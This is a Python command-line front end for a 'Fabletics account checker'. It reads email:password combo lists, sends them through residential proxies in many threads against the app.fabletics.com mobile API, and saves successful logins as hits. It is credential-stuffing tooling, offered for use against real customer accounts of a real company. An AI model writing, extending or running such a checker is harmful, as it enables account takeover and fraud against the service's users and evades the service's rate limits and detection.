from __future__ import annotations

import argparse
import json
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from .checker import check_account, parse_combo, resolve_proxy


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Fabletics account checker (app.fabletics.com mobile API)",
    )
    parser.add_argument(
        "combo",
        nargs="?",
        help="Single combo in email:password format",
    )
    parser.add_argument(
        "-f",
        "--file",
        help="Path to combo list (email:password per line)",
    )
    parser.add_argument(
        "-p",
        "--proxy",
        help=(
            "Proxy URL or host:port:user:pass (default: Evomi residential US proxy). "
            "Pass --no-proxy to disable."
        ),
    )
    parser.add_argument(
        "--no-proxy",
        action="store_true",
        help="Disable proxy (direct connection)",
    )
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=1,
        help="Number of concurrent checks (default: 1)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Print full JSON result for hits",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Append hits to this output file",
    )
    return parser


def load_combos(args: argparse.Namespace) -> list[tuple[str, str]]:
    combos: list[tuple[str, str]] = []

    if args.combo:
        parsed = parse_combo(args.combo)
        if not parsed:
            raise SystemExit("Invalid combo format. Use email:password")
        combos.append(parsed)

    if args.file:
        path = Path(args.file)
        if not path.exists():
            raise SystemExit(f"Combo file not found: {path}")
        for line in path.read_text().splitlines():
            parsed = parse_combo(line)
            if parsed:
                combos.append(parsed)

    if not combos:
        raise SystemExit("Provide a combo argument or --file path")

    return combos


def print_result(result, as_json: bool, output_file: str | None) -> None:
    if result.status == "HIT":
        if as_json:
            payload = {
                "status": result.status,
                "email": result.email,
                "password": result.password,
                "data": result.data,
            }
            print(json.dumps(payload, indent=2))
        else:
            print(result.format_hit())

        if output_file:
            with open(output_file, "a", encoding="utf-8") as handle:
                handle.write(result.format_hit() + "\n")
        return

    print(result.format_line())


def selected_proxy(args: argparse.Namespace) -> str | None:
    if args.no_proxy:
        return None
    if args.proxy:
        return resolve_proxy(args.proxy)
    return resolve_proxy()


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()
    combos = load_combos(args)
    proxy = selected_proxy(args)

    if args.threads <= 1 or len(combos) == 1:
        for email, password in combos:
            result = check_account(email, password, proxy=proxy, timeout=args.timeout)
            print_result(result, args.json, args.output)
            if result.status == "RETRY":
                sys.exit(2)
        return

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(
                check_account,
                email,
                password,
                proxy,
                args.timeout,
            ): (email, password)
            for email, password in combos
        }

        retry_seen = False
        for future in as_completed(futures):
            result = future.result()
            print_result(result, args.json, args.output)
            if result.status == "RETRY":
                retry_seen = True

        if retry_seen:
            sys.exit(2)


if __name__ == "__main__":
    main()
